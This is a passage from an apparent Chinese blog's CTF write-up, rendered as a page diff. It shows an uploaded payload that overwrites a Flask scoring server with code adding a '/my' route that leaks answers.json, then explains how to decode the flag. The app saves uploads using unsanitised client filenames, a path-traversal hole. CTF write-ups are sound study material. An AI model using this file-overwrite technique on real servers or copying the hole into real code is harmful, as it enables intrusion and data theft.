+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">from flask import Flask, render_template, request, flash, redirect
+</span></span><span class="line"><span class="cl">import json
+</span></span><span class="line"><span class="cl">import os
+</span></span><span class="line"><span class="cl">import traceback
+</span></span><span class="line"><span class="cl">import secrets
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">app = Flask(__name__)
+</span></span><span class="line"><span class="cl">app.secret_key = secrets.token_urlsafe(64)
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">UPLOAD_DIR = &#34;/tmp/uploads&#34;
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">os.makedirs(UPLOAD_DIR, exist_ok=True)
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"># results is a list
+</span></span><span class="line"><span class="cl">try:
+</span></span><span class="line"><span class="cl">    with open(&#34;results.json&#34;) as f:
+</span></span><span class="line"><span class="cl">        results = json.load(f)
+</span></span><span class="line"><span class="cl">except FileNotFoundError:
+</span></span><span class="line"><span class="cl">    results = []
+</span></span><span class="line"><span class="cl">    with open(&#34;results.json&#34;, &#34;w&#34;) as f:
+</span></span><span class="line"><span class="cl">        json.dump(results, f)
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">def get_answer():
+</span></span><span class="line"><span class="cl">    # scoring with answer
+</span></span><span class="line"><span class="cl">    # I could change answers anytime so let&#39;s just load it every time
+</span></span><span class="line"><span class="cl">    with open(&#34;answers.json&#34;) as f:
+</span></span><span class="line"><span class="cl">        answers = json.load(f)
+</span></span><span class="line"><span class="cl">        # sanitize answer
+</span></span><span class="line"><span class="cl">        for idx, i in enumerate(answers):
+</span></span><span class="line"><span class="cl">            if i &lt; 0:
+</span></span><span class="line"><span class="cl">                answers[idx] = 0
+</span></span><span class="line"><span class="cl">    return answers
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">@app.route(&#34;/my&#34;, methods=[&#34;GET&#34;])
+</span></span><span class="line"><span class="cl">def my_index():
+</span></span><span class="line"><span class="cl">    return open(&#34;answers.json&#34;, &#34;r&#34;).read()
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">@app.route(&#34;/&#34;, methods=[&#34;GET&#34;])
+</span></span><span class="line"><span class="cl">def index():
+</span></span><span class="line"><span class="cl">    return render_template(&#34;index.html&#34;, results=sorted(results))
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">@app.route(&#34;/submit&#34;, methods=[&#34;POST&#34;])
+</span></span><span class="line"><span class="cl">def submit():
+</span></span><span class="line"><span class="cl">    if &#34;file&#34; not in request.files or request.files[&#39;file&#39;].filename == &#34;&#34;:
+</span></span><span class="line"><span class="cl">        flash(&#34;你忘了上传文件&#34;)
+</span></span><span class="line"><span class="cl">        return redirect(&#34;/&#34;)
+</span></span><span class="line"><span class="cl">    file = request.files[&#39;file&#39;]
+</span></span><span class="line"><span class="cl">    filename = file.filename
+</span></span><span class="line"><span class="cl">    filepath = os.path.join(UPLOAD_DIR, filename)
+</span></span><span class="line"><span class="cl">    file.save(filepath)
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    answers = get_answer()
+</span></span><span class="line"><span class="cl">    try:
+</span></span><span class="line"><span class="cl">        with open(filepath) as f:
+</span></span><span class="line"><span class="cl">            user = json.load(f)
+</span></span><span class="line"><span class="cl">    except json.decoder.JSONDecodeError:
+</span></span><span class="line"><span class="cl">        flash(&#34;你提交的好像不是 JSON&#34;)
+</span></span><span class="line"><span class="cl">        return redirect(&#34;/&#34;)
+</span></span><span class="line"><span class="cl">    try:
+</span></span><span class="line"><span class="cl">        score = 0
+</span></span><span class="line"><span class="cl">        for idx, i in enumerate(answers):
+</span></span><span class="line"><span class="cl">            score += (i - user[idx]) * (i - user[idx])
+</span></span><span class="line"><span class="cl">    except:
+</span></span><span class="line"><span class="cl">        flash(&#34;分数计算出现错误&#34;)
+</span></span><span class="line"><span class="cl">        traceback.print_exc()
+</span></span><span class="line"><span class="cl">        return redirect(&#34;/&#34;)
+</span></span><span class="line"><span class="cl">    # ok, update results
+</span></span><span class="line"><span class="cl">    results.append(score)
+</span></span><span class="line"><span class="cl">    with open(&#34;results.json&#34;, &#34;w&#34;) as f:
+</span></span><span class="line"><span class="cl">        json.dump(results, f)
+</span></span><span class="line"><span class="cl">    flash(f&#34;评测成功，你的平方差为 {score}&#34;)
+</span></span><span class="line"><span class="cl">    return redirect(&#34;/&#34;)
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">-----------------------------403668309233383699842713014961--
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>注入完成后，访问 <code>/my</code> 就可以访问到完整的 <code>answers.json</code> 文件内容。其内容是 list of integer，+65 后转 ascii 就可以看到 flag。（我哭死，它甚至把偏移都告诉我了）</p>
+
+</section>
+
+
+    <footer class="article-footer">
+    
+
+    
+    <section class="article-copyright">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <path d="M14.5 9a3.5 4 0 1 0 0 6" />
+</svg>
+
+
+
+        <span>CC BY-NC-SA 4.0 License</span>
+    </section>
+    </footer>
+
+
+    
+</article>
+
+    
+
+    
+
+<aside class="related-content--wrapper">
+    <h2 class="section-title">相关文章</h2>
+    <div class="related-content">
+        <div class="flex article-list--tile">
+            
+                
+<article class="">
+    <a href="/2025/cmu15445-p1/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">CMU 15-445 Project #1</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
+    <a href="/2025/cmu15445-p0/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">CMU 15-445 Project #0</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
+    <a href="/2023/cs144/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">CS 144 TCP</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
+    <a href="/2023/hackergame-2023/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">Hackergame 2023</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
+    <a href="/2021/tzmcm-2021/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">TZMCM 2021 比赛代码</h2>
+        </div>
+    </a>
+</article>
+
+            
+        </div>
+    </div>
+</aside>
+
+     
+    
+        
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+            2021 - 
+        
+        2025 黯梦萦辰
+    </section>
+    
+    <section class="powerby">
+        
+            <a href="https://github.com/iyume/blog-hugo/">Github</a> & <a href="https://www.jsdelivr.com/">jsDelivr</a> & <a href="https://www.cloudflare.com/">Cloudflare</a><br><a href="http://beian.miit.gov.cn/">粤ICP备2020138189号</a> <br/>
+        使用 <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> 构建 <br />
+        主题 <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.29.0">Stack</a></b> 由 <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a> 设计
+    </section>
+</footer>
+
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
+            >
+
+            </main>
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
+                
+                >
+            </script><script type="text/javascript" src="/ts/main.1e9a3bafd846ced4c345d084b355fb8c7bae75701c338f8a1f8a82c780137826.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+
+    </body>
+</html>
